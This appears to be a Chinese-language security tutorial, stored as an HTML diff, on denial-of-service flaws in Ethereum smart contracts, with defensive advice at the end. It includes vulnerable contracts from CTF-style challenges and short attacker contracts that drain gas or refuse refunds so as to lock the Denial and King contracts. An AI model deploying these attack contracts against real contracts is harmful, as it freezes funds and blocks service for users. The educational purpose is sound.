@@ -1,0 +1,270 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="54338e0ae0fd7878dfa14e69d681ba8f">0x01 前言</h1>
+<p>拒绝服务漏洞，简称DOS，是一种旨在破坏正常的服务，使得服务中断或者暂停，导致用户无法访问或者使用服务</p>
+<p>同时在智能合约中也可能存在拒绝服务漏洞，使得发生锁币，无法正常竞拍等等现象发生，从而带来恶劣的影响。</p>
+<h1 data-content="1" id="efa49325c08f49ab1e361737b3eb9a1a">0x02 预备知识</h1>
+<p>本部分简略介绍应该掌握的知识点</p>
+<ul>
+<li>
+<p>Send,Transfer</p>
+</li>
+<li>
+<p>Call,Delegatecall,Callcode</p>
+</li>
+<li>
+<p>函数修饰关键词</p>
+</li>
+<li>
+<p>Require,Revert</p>
+</li>
+<li>
+<p>合约继承</p>
+</li>
+<li>
+<p>数组和映射</p>
+</li>
+<li>
+<p>gas费率</p>
+</li>
+</ul>
+<h1 data-content="1" id="120dee82a06a1368496c3aea36c1016e">0x03 已知漏洞类型</h1>
+<p>本部分将归纳出现的拒绝服务漏洞类型</p>
+<ol>
+<li>未设定gas费率的外部调用</li>
+<li>依赖外部的调用进展</li>
+<li>owner错误操作</li>
+<li>数组或映射过长</li>
+<li>逻辑设计错误</li>
+<li>缺少依赖库</li>
+</ol>
+<p>下面将结合简单的示例或真实存在的受害合约进行分析</p>
+<h1 data-content="1" id="757d147cca6978636a9af6468a2f03b2">0x04 未设定gas费率的外部调用</h1>
+<p>在合约中你可能想要通过call调用去执行某些东西的时候，因为未设定gas费率导致可能发生恶意的调用。</p>
+<div class="highlight"><pre><span></span><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.6.0</span><span class="p">;</span>
+
+<span class="kr">import</span> <span class="s1">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Denial</span> <span class="p">{</span>
+
+    <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">partner</span><span class="p">;</span> <span class="c1">// withdrawal partner - pay the gas, split the withdraw</span>
+    <span class="nx">address</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="nx">constant</span> <span class="nx">owner</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="mh">0xA9E</span><span class="p">);</span>
+    <span class="nx">uint</span> <span class="nx">timeLastWithdrawn</span><span class="p">;</span>
+    <span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="p">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="nx">withdrawPartnerBalances</span><span class="p">;</span> <span class="c1">// keep track of partners balances</span>
+
+    <span class="kd">function</span> <span class="nx">setWithdrawPartner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_partner</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">partner</span> <span class="o">=</span> <span class="nx">_partner</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// withdraw 1% to recipient and 1% to owner</span>
+    <span class="kd">function</span> <span class="nx">withdraw</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">uint</span> <span class="nx">amountToSend</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">.</span><span class="nx">div</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+        <span class="c1">// perform a call without checking return</span>
+        <span class="c1">// The recipient can revert, the owner will still get their share</span>
+        <span class="nx">partner</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">amountToSend</span><span class="p">)(</span><span class="s2">""</span><span class="p">);</span>
+        <span class="nx">owner</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">amountToSend</span><span class="p">);</span>
+        <span class="c1">// keep track of last withdrawal time</span>
+        <span class="nx">timeLastWithdrawn</span> <span class="o">=</span> <span class="nx">now</span><span class="p">;</span>
+        <span class="nx">withdrawPartnerBalances</span><span class="p">[</span><span class="nx">partner</span><span class="p">]</span> <span class="o">=</span> <span class="nx">withdrawPartnerBalances</span><span class="p">[</span><span class="nx">partner</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">amountToSend</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// allow deposit of funds</span>
+    <span class="nx">fallback</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{}</span>
+
+    <span class="c1">// convenience function</span>
+    <span class="kd">function</span> <span class="nx">contractBalance</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。</p>
+<div class="highlight"><pre><span></span><span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
+    <span class="nx">address</span> <span class="nx">instance_address</span> <span class="o">=</span> <span class="nx">instance_address_here</span><span class="p">;</span>
+    <span class="nx">Denial</span> <span class="nx">target</span> <span class="o">=</span> <span class="nx">Denial</span><span class="p">(</span><span class="nx">instance_address</span><span class="p">);</span>
+
+    <span class="kd">function</span> <span class="nx">hack</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">target</span><span class="p">.</span><span class="nx">setWithdrawPartner</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+        <span class="nx">target</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="p">()</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">target</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
+    <span class="p">}</span> 
+<span class="p">}</span>
+</pre></div>
+<p>或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了</p>
+<div class="highlight"><pre><span></span><span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
+    <span class="nx">address</span> <span class="nx">instance_address</span> <span class="o">=</span> <span class="nx">instance_address_here</span><span class="p">;</span>
+    <span class="nx">Denial</span> <span class="nx">target</span> <span class="o">=</span> <span class="nx">Denial</span><span class="p">(</span><span class="nx">instance_address</span><span class="p">);</span>
+    <span class="kd">function</span> <span class="nx">hack</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">target</span><span class="p">.</span><span class="nx">setWithdrawPartner</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+        <span class="nx">target</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="p">()</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">assert</span><span class="p">(</span><span class="mi">0</span><span class="o">==</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<h1 data-content="1" id="1180bc19fa2fee351847f9ea99d9bcb1">0x05 依赖外部的调用进展</h1>
+<p>这类漏洞常见于竞拍的合约当中，你的想法是如果有人出价高于现阶段的价格，就把当前的竞拍者的token退还给他，再去更新竞拍者，殊不知transfer函数执行失败后，亦会使下面的步骤无法执行。</p>
+<div class="highlight"><pre><span></span><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.6.0</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">King</span> <span class="p">{</span>
+
+  <span class="nx">address</span> <span class="nx">payable</span> <span class="nx">king</span><span class="p">;</span>
+  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">prize</span><span class="p">;</span>
+  <span class="nx">address</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
+
+  <span class="nx">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>  
+    <span class="nx">king</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="nx">prize</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="nx">fallback</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;=</span> <span class="nx">prize</span> <span class="o">||</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">);</span>
+    <span class="nx">king</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
+    <span class="nx">king</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="nx">prize</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">_king</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">king</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210719160020-5d105be0-e867-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4.18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Attacker</span><span class="p">{</span>
+    <span class="nx">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">target</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">payable</span><span class="p">{</span>
+        <span class="nx">target</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">gas</span><span class="p">(</span><span class="mi">1000000</span><span class="p">).</span><span class="nx">value</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">)();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">//未定义fallback函数，就没有payable修饰</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210719160038-67edfdce-e867-1.png"/></p>
+<h1 data-content="1" id="8ff7c9a55980016cd9e5e3772bd64d1b">0x06 owner错误操作</h1>
+<p>本类型涉及到函数修饰关键词的使用，owner可以设定合约的当前状态，因为错误的操作使得当前合约的状态设置为不可交易，出现非主观的拒绝服务。将令牌系统理解为股市，有时需要进行休市操作。</p>
+<div class="highlight"><pre><span></span><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4.24</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">error</span><span class="p">{</span>
+    <span class="nx">address</span> <span class="nx">owner</span><span class="p">;</span>
+    <span class="nx">bool</span> <span class="nx">activestatus</span><span class="p">;</span>
+
+    <span class="nx">modifier</span> <span class="nx">onlyowner</span><span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="o">==</span><span class="nx">owner</span><span class="p">);</span>
+        <span class="nx">_</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">modifier</span> <span class="nx">active</span><span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">activestatus</span><span class="p">);</span>
+        <span class="nx">_</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nx">activecontract</span><span class="p">()</span> <span class="nx">onlyowner</span><span class="p">{</span>
+        <span class="nx">activestatus</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nx">inactivecontract</span><span class="p">()</span> <span class="nx">onlyowner</span><span class="p">{</span>
+        <span class="nx">activestatus</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nx">transfer</span><span class="p">()</span> <span class="nx">active</span><span class="p">{</span>
+
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</pre></div>
+<p>如果owner调用了inactivecontract函数，使得activestatus变成false</p>
+<p>之后所有被active修饰的函数都无法调用，无法通过require判定</p>
+<p>令牌生态系统的整个操作取决于一个地址，这是非常危险的</p>
+<h1 data-content="1" id="2fbb59a4db23034a00b77045f69ba008">0x07 数组或映射过长</h1>
+<p>本类型的漏洞存在于利益分发合约，类似于公司给股东的分红，但是由于以太坊区块有gas费率交易上限，如果数组过大会导致操作执行的gas远远超出上限，从而导致交易失败，也就无法分红</p>
+<div class="highlight"><pre><span></span><span class="nx">contract</span> <span class="nx">DistributeTokens</span> <span class="p">{</span>
+    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span> <span class="c1">// gets set somewhere</span>
+    <span class="nx">address</span><span class="p">[]</span> <span class="nx">investors</span><span class="p">;</span> <span class="c1">// array of investors</span>
+    <span class="nx">uint</span><span class="p">[]</span> <span class="nx">investorTokens</span><span class="p">;</span> <span class="c1">// the amount of tokens each investor gets</span>
+
+    <span class="c1">// ... extra functionality, including transfertoken()</span>
+
+    <span class="kd">function</span> <span class="nx">invest</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nx">investors</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+        <span class="nx">investorTokens</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">*</span> <span class="mi">5</span><span class="p">);</span> <span class="c1">// 5 times the wei sent</span>
+        <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">distribute</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">);</span> <span class="c1">// only owner</span>
+        <span class="k">for</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">investors</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+            <span class="c1">// here transferToken(to,amount) transfers "amount" of tokens to the address "to"</span>
+            <span class="nx">transferToken</span><span class="p">(</span><span class="nx">investors</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span><span class="nx">investorTokens</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span> 
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>该漏洞的另一个关键点在于循环遍历的数组可以被人为扩充<br/>
+在distribute()函数中使用的循环数组的扩充在invert()函数里面，但是invert()函数是public属性，也就意味着可以创建很多的用户账户，让数组变得非常大，从而使distribute()函数因为超出以太坊区块gas费率上限而无法成功执行</p>
+<h1 data-content="1" id="bd686049e9b9de0a8fb575ecf1fcda33">0x08 依赖库问题</h1>
+<p>依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。</p>
+<p>万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p>
+<p>Parity 钱包遭受的第二次攻击是一个很好的例子。</p>
+<p>Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。</p>
+<p>库合约本质上也不过是另外一个智能合约，这次攻击调用使用的是库合约本身的上下文，对调用者而言这个库合约是未经初始化的。</p>
+<p>攻击流程</p>
+<p>1.攻击者调用初始化函数把自己设置为库合约的 owner。</p>
+<p>2.攻击者调用 kill() 函数，把库合约删除，所有的 ether 就被冻结了</p>
+<h1 data-content="1" id="d8f555ee10649754a9bb5dd368ffeda7">0x09 逻辑设计错误</h1>
+<p>本类型漏洞分析Edgeware锁仓合约的拒绝服务漏洞</p>
+<p>Edgeware锁仓合约可以理解为你往银行里定期存款，之后会给你收益，关键点在于发送token后要进行lock操作，把你的资金锁起来，暂时无法提现，本类型漏洞会导致参与者lock失败，从而无法获得收益。</p>
+<p>关键代码</p>
+<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">lock</span><span class="p">(</span><span class="nx">Term</span> <span class="nx">term</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">edgewareAddr</span><span class="p">,</span> <span class="nx">bool</span> <span class="nx">isValidator</span><span class="p">)</span>
+        <span class="nx">external</span>
+        <span class="nx">payable</span>
+        <span class="nx">didStart</span>
+        <span class="nx">didNotEnd</span>
+    <span class="p">{</span>
+        <span class="nx">uint256</span> <span class="nx">eth</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+        <span class="nx">address</span> <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+        <span class="nx">uint256</span> <span class="nx">unlockTime</span> <span class="o">=</span> <span class="nx">unlockTimeForTerm</span><span class="p">(</span><span class="nx">term</span><span class="p">);</span>
+        <span class="c1">// Create ETH lock contract</span>
+        <span class="nx">Lock</span> <span class="nx">lockAddr</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">Lock</span><span class="p">).</span><span class="nx">value</span><span class="p">(</span><span class="nx">eth</span><span class="p">)(</span><span class="nx">owner</span><span class="p">,</span> <span class="nx">unlockTime</span><span class="p">);</span>
+        <span class="c1">// ensure lock contract has at least all the ETH, or fail</span>
+        <span class="nx">assert</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">lockAddr</span><span class="p">).</span><span class="nx">balance</span> <span class="o">&gt;=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
+        <span class="nx">emit</span> <span class="nx">Locked</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span> <span class="nx">eth</span><span class="p">,</span> <span class="nx">lockAddr</span><span class="p">,</span> <span class="nx">term</span><span class="p">,</span> <span class="nx">edgewareAddr</span><span class="p">,</span> <span class="nx">isValidator</span><span class="p">,</span> <span class="nx">now</span><span class="p">);</span>
+    <span class="p">}</span>
+</pre></div>
+<pre><code>assert(address(lockAddr).balance &gt;= msg.value);</code></pre>
+<p>​   这段代码做了强制判断：属于参与者的 Lock 合约的金额必须等于参与者锁仓时发送的金额，如果不等于，意味着 lock 失败，这个失败会导致参与者的 Lock 合约“瘫痪”而形成“拒绝服务”，直接后果就是：假如攻击持续着，Edgeware 这个 Lockdrop 机制将不再可用。 但这个漏洞对参与者的资金无影响。那么，什么情况下会导致“address(lockAddr).balance 不等于 msg.value” 攻击者如果能提前推测出参与者的 Lock 合约地址就行（这在以太坊黄皮书里有明确介绍，可以计算出来），此时攻击者只需提前往参与者的 Lock 合约地址随便转点 ETH 就好，就会导致参与者无法lock从而无法获取收益</p>
+<h1 data-content="1" id="76cab7122ddaf9d3c0309b8bb761cd88">0x0a 防御措施</h1>
+<ul>
+<li>
+<p>未设定gas费率的外部调用</p>
+<p>使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p>
+</li>
+<li>
+<p>依赖外部的调用进展</p>
+<p>在竞拍合约中尽量让合约参与者自提参与竞拍的token，其次如果确实需要对外部函数调用的结果进行处理才能进入新的状态，请考虑外部调用可能一直失败的情况，也可以添加基于时间的操作，防止外部函数调用一直无法满足require判断。</p>
+</li>
+<li>
+<p>owner错误操作</p>
+<p>建议设计多个owner地址，避免密钥遗失等问题发生时，导致合约被锁，同时一个综合系统中只有一个绝对权限的管理员是极其不安全的。</p>
+</li>
+<li>
+<p>数组或映射过长</p>
+<p>避免需要循环操作的数组或映射能够被外部调用，同时在合理的增长过程，可以采用分区块处理的方式，避免数组或映射过大失败。</p>
+</li>
+<li>
+<p>依赖库问题</p>
+<p>继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</p>
+</li>
+<li>
+<p>逻辑设计错误</p>
+<p>合约正式上链之前一定要进行审计，避免未知的情况发生。特别是判断条件，慎之又慎。之前的有一个案例</p>
+<div class="highlight"><pre><span></span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="o">==</span><span class="nx">owner</span><span class="p">);</span>
+<span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="o">!=</span><span class="nx">owner</span><span class="p">);</span>
+</pre></div>
+<p>本应该是上面的写法却写成了下面的代码。</p>
+</li>
+</ul>
+</div>
+</div>
